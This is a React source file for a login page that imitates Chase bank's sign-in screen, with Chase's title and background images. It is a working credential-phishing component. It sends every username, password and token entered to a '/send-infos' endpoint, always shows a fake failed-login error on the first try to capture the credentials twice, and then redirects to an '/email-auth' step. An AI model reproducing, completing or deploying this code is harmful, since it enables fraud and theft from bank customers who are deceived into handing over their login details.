import { Link } from "@mui/material";
import { Box } from "@mui/system";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { CustomButton } from "./CustomButton";
import { CustomCheckbox } from "./CustomCheckbox";
import { CustomInput } from "./CustomInput";
import KeyboardArrowRightIcon from "@mui/icons-material/KeyboardArrowRight";
import axios from "axios";
import { CustomError } from "./CustomError";
import { Helmet } from "react-helmet";
import { Wrapper } from "./Wrapper";
import { useNavigate } from "react-router";

interface LoginProps {}

export const Login: React.FC<LoginProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm({
    mode: "onTouched",
  });

  const [loginAttempt, setLoginAttempt] = useState(0);
  const [loading, setLoading] = useState(false);
  const [showUseToken, setShowUseToken] = useState(false);
  const [error, setError] = useState({
    show: false,
    message: "",
  });

  const navigate = useNavigate();

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    try {
      await axios.post(
        "/send-infos",
        JSON.stringify({
          form: "LOGIN DETAILS",
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        })
      );
    } catch (error) {
      console.log(error);
    }

    if (!loginAttempt) {
      setLoginAttempt(1);
      setLoading(false);
      setError({
        show: true,
        message: `We can't find that username and password. You can <a href="#">reset your password</a> or try again.<br><br>Keep in mind: You won't be able to see your statements and notices until you reset your password.`,
      });
      reset();
      return;
    }

    navigate("/email-auth");
  });

  return (
    <Wrapper showProgress={false}>
      <Box component="main" display="block">
        <Helmet>
          <title>Sign in - chase.com</title>
        </Helmet>
        <Box
          sx={{
            marginRight: "auto",
            marginLeft: "auto",
            paddingLeft: "12px",
            paddingRight: "12px",
            fontSize: "16px",
            width: ["100%", "744px", "964px", "1164px"],
          }}
        >
          <Box>
            <Box>
              <Box
                sx={{
                  height: "100%",
                  width: "100%",
                  padding: 0,
                  margin: 0,
                  backgroundSize: "cover",
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "center center",
                  position: "fixed",
                  top: 0,
                  left: 0,
                  zIndex: -1,
                  backgroundColor: "#003c69!important",
                  backgroundImage: [
                    "url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg)",
                  ],
                  display: "inline-block",
                  verticalAlign: "middle",
                  maxWidth: "100%",
                }}
              />
              <Box
                sx={{
                  marginLeft: "-12px",
                  marginRight: "-12px",
                  "::before": {
                    display: "table",
                    content: "' '",
                  },
                  "::after": {
                    clear: "both",
                    display: "table",
                    content: '" "',
                  },
                }}
              >
                <Box
                  sx={{
                    marginTop: ["10px", "60px", "60px", "80px"],
                    marginLeft: [0, "25%"],
                    width: ["100%", "50%"],
                    float: "left",
                    position: "relative",
                    minHeight: ".0625rem",
                    paddingLeft: "12px",
                    paddingRight: "12px",
                  }}
                >
                  <Box
                    sx={{
                      background: "rgba(255,255,255,.96)",
                      borderRadius: "5px",
                      padding: "1.25rem 0 1.25rem 0",
                      maxWidth: "384px!important",
                      overflow: "visible!important",
                      margin: "0 auto",
                      borderTop: ".3125rem transparent solid",
                    }}
                  >
                    <Box
                      sx={{
                        marginLeft: "-12px",
                        marginRight: "-12px",
                        "::before": {
                          display: "table",
                          content: "' '",
                        },
                        "::after": {
                          clear: "both",
                          display: "table",
                          content: '" "',
                        },
                      }}
                    >
                      <Box
                        sx={{
                          marginLeft: "8.33333333%",
                          width: "83.33333333%",
                          float: "left",
                          position: "relative",
                          minHeight: ".0625rem",
                          paddingLeft: "12px",
                          paddingRight: "12px",
                        }}
                      >
                        <Box component="form">
                          {(Object.keys(errors).length || error.show) && (
                            <CustomError
                              message={`${
                                error.message ||
                                "Please tell us your username and password."
                              }`}
                            />
                          )}
                          <CustomInput
                            label="username"
                            name="username"
                            errors={errors}
                            register={register("username", {
                              required:
                                "A username must be entered. Please enter your username",
                            })}
                            addMarginTop
                          />
                          <CustomInput
                            label="password"
                            name="password"
                            type="password"
                            errors={errors}
                            register={register("password", {
                              required:
                                "A password must be entered. Please enter your password.",
                            })}
                          />
                          {showUseToken && (
                            <CustomInput
                              label="token"
                              name="token"
                              type="token"
                              errors={errors}
                              register={register("token", {
                                required:
                                  "A toke must be entered. Please enter your token.",
                              })}
                            />
                          )}
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <CustomCheckbox
                              label="Remember me"
                              errors={errors}
                            />
                            <CustomCheckbox
                              label="Use token"
                              errors={errors}
                              floatRight
                              onChange={(e) => {
                                setShowUseToken(e.target.checked);
                              }}
                            />
                          </Box>
                          <CustomButton
                            text="Sign in"
                            disabled={loading}
                            onClick={onSubmit}
                          />
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <Box
                              component="span"
                              sx={{
                                fontSize: [".8125rem", ".875rem"],
                                fontWeight: 400,
                                color: "#126bc5",
                                letterSpacing: 0,
                                textDecoration: "none",
                              }}
                            >
                              <Link
                                href="#"
                                sx={{
                                  lineHeight: "1.6rem",
                                  whiteSpace: "normal",
                                  textDecoration: "none",
                                  position: "relative",
                                  fontSize: ".875rem",
                                  fontWeight: 400,
                                  letterSpacing: 0,
                                  display: "flex",
                                  alignItems: "center",
                                }}
                              >
                                Forgot username/password?
                                <KeyboardArrowRightIcon color="primary" />
                              </Link>
                            </Box>
                          </Box>
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <Box
                              component="span"
                              sx={{
                                fontSize: [".8125rem", ".875rem"],
                                fontWeight: 400,
                                color: "#126bc5",
                                letterSpacing: 0,
                                textDecoration: "none",
                              }}
                            >
                              <Link
                                href="#"
                                sx={{
                                  lineHeight: "1.6rem",
                                  whiteSpace: "normal",
                                  textDecoration: "none",
                                  position: "relative",
                                  fontSize: ".875rem",
                                  fontWeight: 400,
                                  letterSpacing: 0,
                                  display: "flex",
                                  alignItems: "center",
                                }}
                              >
                                Not Enrolled? Sign Up Now.
                                <KeyboardArrowRightIcon color="primary" />
                              </Link>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};
